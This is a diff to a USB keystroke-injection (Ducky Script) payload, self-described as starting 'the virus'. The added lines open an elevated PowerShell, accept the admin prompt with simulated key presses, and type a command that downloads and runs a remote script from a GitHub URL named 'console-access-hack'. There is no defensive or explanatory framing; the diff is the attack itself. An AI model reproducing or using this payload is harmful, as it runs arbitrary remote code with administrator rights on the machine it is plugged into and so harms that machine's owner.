@@ -1,6 +1,10 @@
 REM starts the virus up
 GUI r
 DELAY 1000
-STRING powershell
+STRING powershell Start-Process powershell -Verb runAs
 ENTER
-STRING 
+DELAY 2000
+RIGHT
+DELAY 1000
+ENTER
+STRING iex (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/keltonxgame/console-access-hack/main/script.ps1")
